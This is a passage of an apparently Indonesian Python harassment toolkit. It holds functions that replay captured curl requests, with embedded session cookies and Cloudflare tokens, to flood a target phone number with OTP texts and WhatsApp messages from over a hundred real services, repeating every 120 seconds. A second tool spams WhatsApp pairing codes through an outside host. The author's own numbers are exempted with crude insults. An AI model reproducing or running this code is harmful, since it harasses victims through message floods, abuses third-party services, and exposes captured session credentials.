sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F151.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fels.id%2F; cf_clearance=u6Yw53DFZSn56DwrIlr_ZxIJ9QfqwnH2LibY8_8COnI-1787470010-1.2.1.1-_Yzp10QlUiRV7_dM.hIBu_eQ3j3H1PjSGu1muhrB4u_RL0xoU8qhCyhl.N3cRybkTtmjWUhDR67gbn9HDIdr00a2BrABvmCMw8UEUo0e0aU2M3I9tnuq6rNMdEyNQm4Xba4pBLulS543BCbF.BGwHOhtvHDuLDN5acRtj9dibyAytzGMrvioCMqvNZxo7yxNb2YWZSjJdkyGp9kAwNCxYNl5_1JQFV7BxjNGKWwjsYxwxR.V1NU6M6X60TAIR5e9PLg2EvtnobHKN0BN2L__rm21D8d32j1hU0zbYeg5dAYipblrEk6X1JwYTUMSoO1bxZ8nJOFpq.HJ.1.QBfBb9nzY7jioh7dIdfxkoJ9I73s; _ga_E3DHK5EHFD=GS2.1.s1787470004$o1$g1$t1787470057$j7$l0$h0; ESODA_ELS_MEMBERSHIP=4612f1cd046264b1e30adf495e046db0; _ga_JT6HY1CYT1=GS2.1.s1787470070$o1$g0$t1787470071$j59$l0$h0' \\
  -d '{{"name":"{name}","mobilephone":"{phone}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_dreamdubai(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://www.dreamdubai.com/send-sms-web' \\
  -H 'host: www.dreamdubai.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://www.dreamdubai.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.dreamdubai.com/login' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: cquid=||; __cq_dnt=0; dw_dnt=0; dwac_7bec52bd774fafa7db63dd4057=W4-0OarJWqvCtL9Z7KY1EK9krjnjhcv-1hY%3D|dw-only|||AED|false|Asia%2FDubai|true; cqcid=abvjR9yv05ESdLZnHR91lRWUF1; sid=W4-0OarJWqvCtL9Z7KY1EK9krjnjhcv-1hY; dwanonymous_4331083bd03400c189943d61e1cec6f3=abvjR9yv05ESdLZnHR91lRWUF1; dwsid=twdRkKTkmCImlUsRMH9LBkPsS5DtqAl3MjcZ87C95egkhfzbVC7cgsGVHXVBcgEW7HRjl0WmItTbDoKBKWbsAQ==; _gcl_au=1.1.1946167819.1787471764; _ga=GA1.1.1950809663.1787471765; _scid=1NHPZChyXKzc0jProZl2Ysvmi_xSTkDN; _scid_r=1NHPZChyXKzc0jProZl2Ysvmi_xSTkDN; _tt_enable_cookie=1; _ttp=01M0PSX8SNJVMS4Z4RMC04KFE5_.tt.1; _fbp=fb.1.1787471766583.518002055353343985; __cq_uuid=abvjR9yv05ESdLZnHR91lRWUF1; __cq_seg=0~0.00!1~0.00!2~0.00!3~0.00!4~0.00!5~0.00!6~0.00!7~0.00!8~0.00!9~0.00; adjust_web_uuid=01084d62-d6eb-46f0-1e7a-2ea4a6d74006; moe_uuid=f12354a2-ff50-4ca4-a11c-894991f0c79e; _ga_5SBWDJD7BR=GS2.1.s1787471764$o1$g1$t1787471783$j41$l0$h0; ttcsid=1787471766394::iLRSmXWkEDcPZtKcpYlf.1.1787471796796.0::1.-6089.0::30175.5.347.429::0.0.0; ttcsid_CMSC9GJC77U67KV9FM3G=1787471766387::4t-aqwqsjjEKeGJ_Bmt5.1.1787471796797.1' \\
  -H 'priority: u=1, i' \\
  --data-raw 'phoneNumber={phone}&countryCode=%2B62&isApp=false&mode=whatsapp-otp'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_bukuaku(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://bukuaku.id/base/forgot_password' \\
  -H 'host: bukuaku.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://bukuaku.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://bukuaku.id/id/login/forgot-password' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: auth.strategy=local; cf_clearance=XqnbImZU1JDSaShhb_lmYSpQqKmmCO9LXzhupeLjb4Q-1787472072-1.2.1.1-QHXLCp4nn93kWxK329lkkBmufK61MrozGvisAi5I63FFG9hOuxAma36dmo1zR_6WDUUGtMKeWjunD.ZVtfBH2naodVEMlOIAbS1gr7UfK5rIGFZOOeoReHAxz_6JUcOZibiR1Eyi64cokdS0l0d2qSoclc86B8J.BNNgGDAE_nGxci1_vsnCw5sfFeWtB5khVDMOks7FA7CEJ_pVcX9gyk53ovGK.8Z7uUlgYm9iS_zebMc4pprAjKdDrueY5Zy12Pky.BIJQJFYqtdechKNkk4bXrch1XONusumwCGokSdr7cmalMeSZXeLgMOq4Ddv8jl5G.ybxcHwECWUY3kr_303wQpLvS7TE9p0PT.Xej0; _gcl_au=1.1.984154179.1787472072; _ga=GA1.1.250152120.1787472073; _ga_9KQFL3Q499=GS2.1.s1787472072$o1$g1$t1787472585$j60$l0$h0; _ga_GN7DGX69XZ=GS2.1.s1787472073$o1$g1$t1787472586$j59$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"otp_type":"WA","phone":"{phone}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def mulai_spam(nomor):
     global cooldown_otp, stop_cooldown, stop_spinner
    
     apis = {
     "0": spam_otp_sidemang,
     "1": spam_otp_adiraku,
     "2": spam_otp_tokopedia,
     "3": spam_otp_singa_kedua,
     "3": spam_otp_singa,
     "3": spam_otp_singa_wa,
     "4": spam_otp_pinhome,
     "5": spam_otp_duniagames,
     "6": spam_otp_acc,
     "6": spam_otp_acc_kedua,
     "7": spam_otp_absenku,
     "8": spam_otp_saturdays,
     "9": spam_otp_maulagi,
     "10": spam_otp_bliblitiket,
     "11": spam_otp_matahari,
     "12": spam_otp_rumah123,
     "13": spam_otp_halodoc,
     "14": spam_otp_misteraladin,
     "15": spam_otp_paper,
     "16": spam_otp_planetban,
     "17": spam_otp_bunda,
     "18": spam_otp_bonusbelanja,
     "19": spam_otp_hijup,
     "20": spam_otp_alodokter_sms,
     "20": spam_otp_alodokter,
     "22": spam_otp_optikmelawai,
     "28": spam_otp_jembatani,
     "28": spam_otp_datascripmall,
     "29": spam_otp_rcx,
     "30": spam_otp_sahabatteknisi,
     "31": spam_otp_liva,
     "32": spam_otp_daihatsu,
     "toy": spam_otp_singa_toy,
     "33": spam_otp_kreditpintar,
     "34": spam_otp_internetrakyat,
     "35": spam_otp_pinjamduit,
     "36": spam_otp_isellershop,
     "37": spam_otp_greensm,
     "38": spam_otp_tiptip,
     "39": spam_otp_dokterin,
     "40": spam_otp_uangme,
     "41": spam_otp_seva,
     "42": spam_otp_uatas,
     "43": spam_otp_topindowa,
     "44": spam_otp_amaha,
     "45": spam_otp_kasirpintar,
     "46": spam_otp_bigseller,
     "47": spam_otp_toyota,
     "48": spam_otp_carro,
     "48": spam_otp_idealz,
     "49": spam_otp_ktakilat,
     "51": spam_otp_bantusaku,
     "52": spam_otp_bisatopup,
     "52": spam_otp_speedcash,
     "53": spam_otp_speedcash_wa,
     "54": spam_otp_speedcash_sms,
     "54": spam_otp_sicepat,
     "55": spam_otp_iskconmumbai,
     "56": spam_otp_jogjakita,
     "57": spam_otp_yogyaonline,
     "58": spam_otp_mengantar,
     "59": spam_otp_volta,
     "60": spam_otp_pluang,
     "60": spam_otp_watsons,
     "61": spam_otp_watsons_kedua,
     "61": spam_otp_youtap,
     "62": spam_otp_beautyhaul,
     "63": spam_otp_byu,
     "64": spam_otp_astradaihatsu2,
     "65": spam_otp_astradaihatsu_sms,
     "65": spam_otp_myvalue,
     "66": spam_otp_vedantu,
     "67": spam_otp_viuum,
     "68": spam_otp_onebunda,
     "69": spam_otp_ibudanbalita,
     "68": spam_otp_joob,
     "68": spam_otp_rivafashion,
     "70": spam_otp_swiggy,
     "71": spam_otp_cilory,
     "72": spam_otp_naturalfarm,
     "74": spam_otp_gritero,
     "75": spam_otp_toss,
     "76": spam_otp_topindosms,
     "78": spam_otp_toss2,
     "79": spam_otp_eiger,
     "80": spam_otp_farmaklik,
     "84": spam_otp_nutriclub,
     "87": spam_otp_eci_signup,
     "88": spam_otp_eci,
     "90": spam_otp_qoalaplus,
     "90": spam_otp_singa_yoi,
     "91": spam_otp_uangme,
     "92": telp_spam_jogjakita,
     "93": spam_otp_fastwork,
     "94": spam_otp_sms_optikmelawai,
     "95": spam_otp_mapclub_wa,
     "95": spam_otp_mapclub_wa_kedua,
     "96": spam_otp_mapclub_sms,
     "96": spam_otp_mapclub_sms_kedua,
     "97": spam_otp_ruparupa,
     "98": spam_otp_cashenable,
     "99": spam_otp_eraspace,
     "99": spam_otp_jec,
     "100": spam_otp_oyorooms,
     "101": spam_otp_kitabisa_wea,
     "102": spam_otp_auto2000,
     "103": spam_otp_buccheri,
     "104": spam_otp_generasimaju,
     "105": spam_otp_norkaroots,
     "106": spam_otp_kpoin,
     "107": spam_otp_99co,
     "108": spam_otp_bunda_cms,
     "109": spam_otp_pkumayong,
     "110": spam_otp_babyhappy,
     "111": spam_otp_els,
     "112": spam_otp_dreamdubai,
     "113": spam_otp_bukuaku,
}
     hasil = {}
     total_api = len(apis)
     apis_list = list(apis.items())

     stop_spinner = False
     spinner_thread = threading.Thread(target=loading_spinner)
     spinner_thread.daemon = True
     spinner_thread.start()

     for i, (nama, fungsi) in enumerate(apis_list, 1):
      try:
        hasil[nama] = fungsi(nomor)
      except:
        hasil[nama] = False

      if i < total_api:
        time.sleep(0.2)

     stop_spinner = True
     spinner_thread.join(timeout=1)
    
     with cooldown_lock:
        cooldown_otp = time.time() + 120
    
     print("")
     print(f"{W}╭──────────────────────────────────────────────────────────────────╮{N}")
     print(f"{W}│[ {G}!{W} ] Cooldown 120 detik. Kirim otomatis ulang setelah selesai.{N}")
     print(f"{W}│[ {G}!{W} ] Tekan ENTER untuk kembali ke MIKASA (keluar dari spam){N}")
     print(f"{W}╰──────────────────────────────────────────────────────────────────╯{N}")
     print("")
    
     stop_cooldown = False
     import sys, select
    
         
     for i in range(120, 0, -1):
        if stop_cooldown:
            break
        if select.select([sys.stdin], [], [], 0)[0]:
            cmd = sys.stdin.readline().strip()
            if cmd == "":
                stop_cooldown = True
                break
        print(f"{W}[ {G}!!{W} ] Sisa {i} detik... {R}({W}Tekan ENTER untuk kembali{R}){N}", end="\r")
        time.sleep(1)
    
     print("\n" + " " * 70 + "\r", end="")
    
    
     if stop_cooldown:
        print(f"{W}[ {R}!{W} ] Kembali ke MIKASA...{N}")
        time.sleep(1)
        return
    
     print(f"{W}[ {G}✓{W} ] Mengirim OTP {N}\n")
     time.sleep(1)
     mulai_spam(nomor)

def tool_otp_spam():
    play_menu_sound()
    pantau_aktivitas()
    global cooldown_otp, stop_cooldown
    os.system('clear')
    
   
    with cooldown_lock:
        sisa = cooldown_otp - time.time()
        if sisa > 0:
            print(f"{W}Tunggu {int(sisa)} detik{W} sebelum spam lagi{N}")
            print()
            
            stop_cooldown = False
            import sys, select
            
            for i in range(int(sisa), 0, -1):
                if stop_cooldown:
                    break
                if select.select([sys.stdin], [], [], 0)[0]:
                    cmd = sys.stdin.readline().strip()
                    if cmd == "":
                        stop_cooldown = True
                        break
                print(f"{W}[ {R}!{W} ] Sisa {i} detik...{N}", end="\r")
                time.sleep(1)
            
            print("\n" + " " * 50 + "\r", end="")
            
            if stop_cooldown:
                print(f"{W}[ {R}!{W} ] Kembali ke MIKASA...{N}")
                time.sleep(1)
                return
            
            print(f"{W}[ {W}✓{W} ] Cooldown selesai!{N}")
            time.sleep(1)
            os.system('clear')
    
    ascii_otp = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣴⣶⣶⣶⣤⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣾⣿⡿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠻⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⠉⠀⠀⠀⠀⠀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣿⡿⠟⠁⠀⠀⢀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣿⠏⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠙⢿⣿⣦⠀⠀⠀⠀
⠀⠀⣰⣿⡿⠁⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠹⣿⣷⡀⠀⠀
⠀⣰⣿⡟⠀⠀⢀⣾⣿⣿⣿⡟⠉⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠹⣿⣷⠀⠀
⢠⣿⣿⠁⠀⢀⣾⣿⣿⣿⡟⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⢹⣿⣧⠀
⣼⣿⠇⠀⠀⣼⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⣿⣿⡀
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢹⣿⡇
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⡇
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣸⣿⡇
⢻⣿⡆⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠉⠛⠿⣿⠟⠀⠀⠀⠈⠛⠻⣿⣿⣿⣿⣿⠁⠀⠀⣿⣿⠁
⠘⣿⣷⡀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⠇⠀⠀⣸⣿⡟⠀
⠀⠹⣿⣧⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⣀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⠏⠀⠀⣰⣿⡿⠁⠀
⠀⠀⣿⣿⠇⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⣰⣿⡿⠁⠀⠀
⠀⢠⣿⡿⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⢠⣾⣿⠟⠀⠀⠀⠀
⠀⣼⣿⠇⠀⠀⠘⠛⠉⠉⠁⠉⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⣠⣶⣿⡿⠁⠀⠀⠀⠀⠀
⢰⣿⡿⠀⠀⠀⠀⢀⣀⣠⣤⣄⣀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠁⠀⠀⠀⠀⢀⣠⣴⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠘⣿⣷⣦⣶⣾⣿⣿⠿⠿⠿⠿⢿⣿⣷⣶⣤⣤⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠙⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠻⠿⠿⠿⠛⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
    os.system(f'echo "{ascii_otp}" | lolcat')
    print(f"""
{W}╭────────────────────────────────────────────────────────────────╮
{W}│ Author{R}:{G} Rullzzz_06 {R}|{W} Tools{R}:{G} Spam otp
{W}╰────────────────────────────────────────────────────────────────╯
{W}╭────────────────────────────────────────────────────────────────╮
{W}│ Masukkan Nomor hp Target Contoh {R}:{W} 62xxx {R}/{W} 08xxx
{W}╰────────────────────────────────────────────────────────────────╯""")

    nomor = input(f"{U}❯❯❯ {W}Masukkan Nomor Target {G}❯{W} ").strip()
    

    if nomor == "6283832110509":
       print("ngapain anjeng, kontol, memek, asu 😹")
       os._exit(0)

    if nomor == "085143754083":
       print("ngapain kocak😹")
       os._exit(0)

    if nomor == "6285143754083":
       print("ngapain anjeng, kontol, memek, asu, 😹")
       os._exit(0)

    if nomor == "+6283832110509":
       print("Ngapain Kocak kagak akan bisa😹")
       os._exit(0)

    if nomor == "+6285143754083":
       print("Ngapain Kocak kagak akan bisa😹")
       os._exit(0)

    if not nomor:
        print(f"{W}[ {R}!{W} ] Kembali ke MIKASA...{N}")
        time.sleep(1)
        return
    
    if nomor.startswith("0"):
        nomor = "62" + nomor[1:]
    elif nomor.startswith("+"):
        nomor = nomor[1:]
    elif not nomor.startswith("62"):
        nomor = "62" + nomor

    print(f"\n{W}[ {G}+{W} ] Target{R}:{W} {nomor}{N}")
    mulai_spam(nomor)
    
def tool_pairing_spam():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading
    
    os.system('clear')
    
    R = '\033[91m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    G = '\033[92m'
    N = '\033[0m'
    
    ascii_wea = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣴⣶⣶⣶⣤⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣾⣿⡿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠻⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⠉⠀⠀⠀⠀⠀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣤⣿⡿⠟⠁⠀⠀⢀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣿⠏⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠙⢿⣿⣦⠀⠀⠀⠀
⠀⠀⣰⣿⡿⠁⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠹⣿⣷⡀⠀⠀
⠀⣰⣿⡟⠀⠀⢀⣾⣿⣿⣿⡟⠉⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠹⣿⣷⠀⠀
⢠⣿⣿⠁⠀⢀⣾⣿⣿⣿⡟⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⢹⣿⣧⠀
⣼⣿⠇⠀⠀⣼⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⣿⣿⡀
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢹⣿⡇
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⡇
⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣸⣿⡇
⢻⣿⡆⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠉⠛⠿⣿⠟⠀⠀⠀⠈⠛⠻⣿⣿⣿⣿⣿⠁⠀⠀⣿⣿⠁
⠘⣿⣷⡀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⠇⠀⠀⣸⣿⡟⠀
⠀⠹⣿⣧⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⣀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⠏⠀⠀⣰⣿⡿⠁⠀
⠀⠀⣿⣿⠇⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⣰⣿⡿⠁⠀⠀
⠀⢠⣿⡿⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⢠⣾⣿⠟⠀⠀⠀⠀
⠀⣼⣿⠇⠀⠀⠘⠛⠉⠉⠁⠉⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⣠⣶⣿⡿⠁⠀⠀⠀⠀⠀
⢰⣿⡿⠀⠀⠀⠀⢀⣀⣠⣤⣄⣀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠁⠀⠀⠀⠀⢀⣠⣴⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠘⣿⣷⣦⣶⣾⣿⣿⠿⠿⠿⠿⢿⣿⣷⣶⣤⣤⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⠿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠙⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠻⠿⠿⠿⠛⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_wea}" | lolcat')
    print(f"""
{W}╭────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}:{G}Spam Pairing WhatsApp
{W}╰────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}Nomor{W} Target{N}")
    print(f"{W}│ Contoh {G}:{W} 08xxxxx{N}")
    print(f"{W}╰────────────────────────────────────────────────────────────────╯{N}")
    nomor_input = input(f"{U}❯❯❯{W}Masukkan Nomor Target{G}❯{W} ").strip()
    
    if not nomor_input:
        print(f"\n{R}✗ Nomor tidak boleh kosong!{N}")
        time.sleep(2)
        return
    
    if nomor_input.startswith('0'):
        nomor = '62' + nomor_input[1:]
    elif nomor_input.startswith('+62'):
        nomor = nomor_input[1:]
    elif nomor_input.startswith('62'):
        nomor = nomor_input
    else:
        nomor = '62' + nomor_input
    
    if len(nomor) < 10 or len(nomor) > 15 or not nomor.isdigit():
        print(f"\n{R}✗ Format nomor tidak valid!{N}")
        time.sleep(2)
        return
    
    print(f"\n{G}✓ Target: {C}{nomor}{N}")
    
    confirm = input(f"\n{W}Kirim pairing ke {G}{nomor}{W}? (y/n): {N}")
    if confirm.lower() != 'y':
        print(f"\n{Y}[!] Dibatalkan{N}")
        time.sleep(1)
        return
    
    def kirim_pairing(nomor):
        try:
            url = f"https://pair.subzero.gleeze.com/code?number={nomor}"
            r = requests.get(url, headers={'accept': 'application/json, text/plain, */*'}, timeout=10)
            data = r.json()
            return bool(data.get('code'))
        except:
            return False
    
    def pair_loadbar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 10
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Sedang Mengirim Kode Pairing WhatsApp [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    try:
        stop_loading = threading.Event()
        loading_thread = threading.Thread(target=pair_loadbar, args=(stop_loading,))
        loading_thread.daemon = True
        loading_thread.start()
        
        for i in range(1, 11):
            kirim_pairing(nomor)
            if i < 10:
                time.sleep(3)
        
        stop_loading.set()
        loading_thread.join()
        
        print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
